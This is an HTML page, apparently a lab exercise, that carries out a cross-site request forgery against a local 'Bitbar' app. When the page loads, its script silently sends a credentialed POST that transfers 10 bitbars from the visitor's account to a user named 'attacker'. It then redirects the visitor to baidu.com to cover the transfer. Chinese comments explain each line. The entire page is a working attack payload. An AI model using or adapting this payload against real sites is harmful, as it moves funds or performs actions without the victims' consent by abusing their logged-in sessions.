<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <title>auto send bitbars</title>
    <script>
        const xhr = new XMLHttpRequest(); //创建一个XMLHttpRequest对象
        xhr.open("POST", "http://localhost:3000/post_transfer", false);//初始化一个POST请求,并且保持请求同步
        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');//设置HTTP请求头部
        xhr.withCredentials = true;//允许跨域请求携带凭据cookies
        try 
        {
            xhr.send("destination_username=attacker&quantity=10"); //尝试发送POST请求
        }
        finally 
        {
            window.location.replace("https://www.baidu.com");//跳转
        }
    </script>
</head>
<body>
    
</body>
</html>
